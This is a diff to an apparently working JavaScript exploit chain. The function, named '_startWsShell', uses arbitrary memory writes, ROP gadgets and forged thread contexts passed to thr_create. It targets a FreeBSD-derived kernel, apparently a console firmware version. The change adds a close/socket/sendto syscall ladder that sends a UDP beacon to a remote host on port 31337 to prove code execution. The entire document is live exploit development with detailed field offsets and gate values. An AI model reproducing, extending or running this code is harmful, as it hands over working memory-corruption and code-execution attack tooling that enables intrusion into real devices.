@@ -8247,55 +8247,50 @@ function _startWsShell(){
                   0x178:0xFFFFn,0x188:0xFFFFn,0x198:0xFFFFn,0x1A8:0xFFFFn,
                   0x1D0:0x8180000000000000n,0x1D8:0x4007n,
                   0x230:0x3FF0000000000000n,0x270:0xFFFFFFFFFFFFFFFFn,0x278:0xFFFFFFFFFFFFFFFFn};
-          function buildCtx(base,g,live){ /* g: the child's entry GPRs + gates.
-           * live=true for THE SCOPE ONLY: NO bulk zeroing (the srop12-25
-           * lesson: bulk writes to the live scope kill the call) - write
-           * ONLY the GPR slots + the gates; the scope's other live fields
-           * stay as the preflight left them. Scratch ctxs zero everything. */
+          /* THE KERNEL-TRUE CTX BUILDER (session 229d: the 13.60 mc
+           * converter disassembly - the definitive field map):
+           *   mc_len@ctx+0x88 MUST BE 0x480 (the first gate)
+           *   flags@ctx+0x90: <=7; bit0 arms selectors, bit1 arms FS/GS
+           *   bases - flags=0: the child INHERITS default TLS/selectors
+           *   type@ctx+0xD0: 0x10000 or 0x10002
+           *   subtype@ctx+0xD8: 0x20000 REQUIRED with type 0x10000
+           *                    (THE NO-FP PATH - no FP area at all)
+           *   GPRs ctx+0x48..0xB8 copied 1:1; RIP@ctx+0xA0 RSP@ctx+0xB8
+           * NO CS/SS/RFLAGS gates needed - flags=0 skips them entirely. */
+          function buildCtx(base,g,live){ /* live=true for THE SCOPE ONLY:
+           * NO bulk zeroing (the srop12-25 lesson); scratch ctxs zero. */
             if(!live){for(var z=0;z<0x120/8;z++)S.absWrite(base+BigInt(z*8),0n);}
             S.absWrite(base+0x048n,g.rdi);S.absWrite(base+0x050n,g.rsi);
             S.absWrite(base+0x058n,g.rdx);S.absWrite(base+0x060n,g.rcx||0n);
             S.absWrite(base+0x068n,g.r8||0n);S.absWrite(base+0x070n,g.r9||0n);
             S.absWrite(base+0x078n,g.rax||0n);
-            S.absWrite(base+0x0C0n,0x43n);       /* CS (156c print offset) */
-            S.absWrite(base+0x0D0n,0n);         /* uc_flags <= 7 */
-            S.absWrite(base+0x0E0n,g.rip);
-            S.absWrite(base+0x0E8n,0x43n);      /* CS (FreeBSD-consecutive) */
-            S.absWrite(base+0x0F0n,0x202n);     /* RFLAGS */
-            S.absWrite(base+0x0F8n,g.rsp);
-            S.absWrite(base+0x100n,0x3Bn);      /* SS */
-            S.absWrite(base+0x108n,0x480n);     /* magic */
-            S.absWrite(base+0x110n,0x10000n);   /* type (the no-FP path) */
-            S.absWrite(base+0x118n,0x480n);     /* mc_len - THE 80a GATE */
-            for(var f=0x140;f<0x280;f+=8)S.absWrite(base+BigInt(f),(KFP[f]!==undefined)?KFP[f]:0n);
+            S.absWrite(base+0x088n,0x480n);     /* mc_len - GATE 1 */
+            S.absWrite(base+0x090n,0n);         /* flags=0: inherit TLS/CS */
+            S.absWrite(base+0x0A0n,g.rip);      /* RIP */
+            S.absWrite(base+0x0B8n,g.rsp);      /* RSP */
+            S.absWrite(base+0x0D0n,0x10000n);   /* type */
+            S.absWrite(base+0x0D8n,0x20000n);   /* subtype (no-FP path) */
           }
           /* EXIT_SLOT: every spawned child's ret lands here -> thr_exit */
           S.absWrite(A_EXIT,THR_EXIT);
           S.absWrite(A_WIT,0n);
-          /* childR (the parent's direct spawn, ctx AT THE SCOPE) IS THE
-           * FIRST WAVE-1 WITNESS ITSELF: its first instruction is
-           * sendto(TF_LO, MSG, 32, 0, NULL, 0) - ONE hop from the spawn,
-           * microseconds, unbeatable by the teardown race. Then its ret
-           * walks chainR which spawns: the remaining TCP fd guesses,
-           * childS (the wave-2 socket creator), the UDP fd guesses.
-           * The chain rungs' thr_create inherits RSI=A_MSG (writable -
-           * the tid lands harmlessly in the MSG buffer) and RDX=32 (the
-           * flags gamble: the first fire passed RDX=stale-huge-pointer,
-           * so strict flags validation is already unlikely). */
-          var ctxAddr=[],ci=0;
-          for(var ti=1;ti<TNG;ti++){ /* TF_LO+0 = childR's own fd guess */
-            var caT=A_CTXG+BigInt(ci++)*0x120n;
-            ctxAddr.push(caT);
-            buildCtx(caT,{rdi:BigInt(TF_LO+ti),rsi:A_MSG,rdx:32n,rcx:0n,r8:0n,r9:0n,rax:133n,rip:R10TRAMP,rsp:A_EXIT});
+          /* childR (the parent's direct spawn, ctx AT THE SCOPE) spawns
+           * the chain and walks it. THE FD-INDEPENDENT WITNESS (v4): the
+           * close-range ladder makes the UDP socket's fd DETERMINISTIC:
+           * rungs 1-7: close(3)..close(9) (each child = one close syscall
+           * via the r10 tramp, RAX=6); rung 8: socket(2,2,0) -> the new
+           * UDP socket GETS THE LOWEST FREED FD = 3; rung 9: sendto(3,
+           * MSG, 32, 0, &dest, 16) -> the beacon lands at PC:31337/udp.
+           * No fd guessing, no reliance on pooled connections. */
+          var ctxAddr=[];
+          var ctxAddrPush=function(g){var ca=A_CTXG+BigInt(ctxAddr.length)*0x120n;ctxAddr.push(ca);buildCtx(ca,g);return ca;};
+          for(var cf=3;cf<=9;cf++){
+            ctxAddrPush({rdi:BigInt(cf),rsi:0n,rdx:0n,rax:6n,rip:R10TRAMP,rsp:A_EXIT}); /* close(fd) */
           }
+          ctxAddrPush({rdi:2n,rsi:2n,rdx:0n,rax:97n,rip:R10TRAMP,rsp:A_EXIT});          /* socket(2,2,0) */
+          ctxAddrPush({rdi:3n,rsi:A_MSG,rdx:32n,rcx:0n,r8:A_DEST,r9:16n,rax:133n,rip:R10TRAMP,rsp:A_EXIT}); /* sendto(3,...) */
           buildCtx(A_CTXS,{rdi:2n,rsi:2n,rdx:0n,rax:97n,rip:R10TRAMP,rsp:A_EXIT});
-          ctxAddr.push(A_CTXS);   /* childS: the wave-2 UDP socket creator */
-          for(var gi=0;gi<NG;gi++){
-            var ca=A_CTXG+BigInt(ci++)*0x120n;
-            ctxAddr.push(ca);
-            buildCtx(ca,{rdi:BigInt(FD_LO+gi),rsi:A_MSG,rdx:32n,rcx:0n,r8:A_DEST,r9:16n,rax:133n,rip:R10TRAMP,rsp:A_EXIT});
-          }
-          if(A_CTXG+BigInt(ci)*0x120n>LAD_BASE+0x8000n){reply.err='ctx overflow';break;}
+          if(A_CTXG+BigInt(ctxAddr.length)*0x120n>LAD_BASE+0x8000n){reply.err='ctx overflow';break;}
           /* chainR: [POP_RDI_RBP_RET, CTX, 0, thr_create] per child, then
            * [POP_RDI_RBP_RET, 0, 0, thr_exit]. */
           var ch=A_CHAIN,qw=0;
@@ -8312,17 +8307,15 @@ function _startWsShell(){
           reply.ladder={tcpWave:[TF_LO,TF_HI],udpWave:[FD_LO,FD_HI],chainChildren:ctxAddr.length,firstWitness:'childR sendto fd '+TF_LO,chainQwords:qw,wit:'0x'+A_WIT.toString(16)};
           F3('4 ladder built: childR=w1-fd'+TF_LO+' then '+(ctxAddr.length)+' chain children (w1-tcp='+(TNG-1)+' childS w2-udp='+NG+') qwords='+qw);
 
-          /* ---- 5. THE PARENT CTX = THE SCOPE (RDI is forced there).
-           * Zero ONLY the +0x00..0x20 JSValue heads; the VM pair at
-           * +0x38/+0x40 is NEVER touched (the V82 lesson). THE CHILD'S
-           * ENTRY REGISTERS = childR = THE FIRST TCP WITNESS:
-           * RIP=r10-tramp, RAX=133(sendto), RDI=TF_LO (the fd guess),
-           * RSI=&MSG, RDX=32, R8=R9=0 (NULL dest = send on the pooled
-           * TLS socket), RSP=chainR (the rest of the ladder). ---- */
+          /* ---- 5. THE PARENT CTX = THE SCOPE. childR = THE CHAIN
+           * WALKER: RIP=thr_create spawns ctx[0] (close(3)), then its
+           * ret walks the chain spawning every subsequent rung.
+           * RSI=&WIT (writable scratch; the 13.60 syscall writes NO tid
+           * for r8=0 but the arg must be sane), RDX=0. ---- */
           for(var zc=0;zc<4;zc++)S.absWrite(S.fakeScope+BigInt(zc*8),0n);
-          var scG={rdi:BigInt(TF_LO),rsi:A_MSG,rdx:32n,rcx:0n,r8:0n,r9:0n,rax:133n,rip:R10TRAMP,rsp:A_CHAIN};
+          var scG={rdi:ctxAddr[0],rsi:A_WIT,rdx:0n,rcx:0n,r8:0n,r9:0n,rax:0n,rip:THR_CREATE,rsp:A_CHAIN};
           buildCtx(S.fakeScope,scG,true);
-          F3('5 scope ctx armed: childR=sendto(fd '+TF_LO+',MSG) RIP=lk+0x3B7 RSP=chain gates on');
+          F3('5 scope ctx armed: childR=thr_create(ctx[0]) RSP=chain kernel-true gates');
 
           /* ---- 6. THE FIRE ---- */
           reply.fired=true;
@@ -8341,7 +8334,7 @@ function _startWsShell(){
           reply.tidChanged=(tidF!==0n&&tidF<0x100000n);
           reply.verified=(S.absRead(S.neEntry.addr+0x28n,8)[0]===origF);
           reply.note='UDP beacon at 31337 = the spawn proof (parent death tolerated by design)';
-        }catch(eF3){reply.err='fire30 fault: '+String(eF3&&eF3.message?eF3.message:'?');}
+        }catch(eF3){reply.err='fire30 fault: '+String(eF3&&eF3.message?eF3.message:'?');reply.stack=String(eF3&&eF3.stack||'').slice(0,400);}
         break;
       }
 
